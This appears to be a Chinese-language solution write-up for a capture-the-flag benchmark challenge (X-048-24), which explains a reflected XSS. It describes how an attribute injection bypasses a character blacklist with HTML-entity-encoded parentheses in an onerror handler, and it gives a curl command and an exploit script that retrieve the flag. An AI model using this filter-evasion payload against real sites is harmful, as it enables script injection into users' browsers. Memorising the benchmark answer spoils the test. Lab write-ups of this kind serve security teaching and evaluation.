# X-048-24 利用说明（XSS：属性注入 + HTML 实体绕过）

## 漏洞原理
- 路由：`GET /page?name=...`
- 模板拼接：后端会将 `name` 拼接为 `><img src="{name}">` 插入页面（未转义），详见 `src/app.py:70-78`。
- 黑名单：`<`、`>`、`(`、`)`、`` ` ``、`´`、`javascript`、`throw`（子串匹配，`msg.lower()`）。
- 评测：PhantomJS 监听 `alert/confirm/prompt`，消息严格等于 `XSS` 即返回 flag。

## 绕过思路
- 打破 `src="..."` 属性：在 `name` 中注入一个双引号 `"`，再追加事件属性。
- 函数调用括号被拦（`(` `)`），改用 HTML 实体 `&#40;` 与 `&#41;`，在浏览器解析时会还原为 `()`。
- 构造：`x" onerror=alert&#40;'XSS'&#41; x="`，放入 `name` 后生成：
  - `<img src="x" onerror=alert('XSS') x="">` → 资源错误触发 `onerror`，弹出 `XSS`。

## 直接命令

```bash
curl "http://ip32811/page?name=x%22%20onerror%3Dalert%26%2340%3B%27XSS%27%26%2341%3B%20x%3D%22"
# 返回页面包含：Here is the flag: FLAG{...}
```

## 一键脚本（exp.py）
- 路径：`benchmarks/X-048-24/exp.py`
- 依赖：`pip install requests`
- 用法：

```bash
python3 benchmarks/X-048-24/exp.py                # 默认 http://ip32811
python3 benchmarks/X-048-24/exp.py http://host:port
```

- 行为：将 `name=x" onerror=alert&#40;'XSS'&#41; x="` 发送至 `/page`，解析并打印 `FLAG{...}`。

## 参考代码
- `src/app.py:66-83`（黑名单与注入点构造）
- `src/check.js`（PhantomJS 触发与弹窗监听）
- `src/Dockerfile:18-20`（flag 写入 `secret.txt` 并由应用返回）

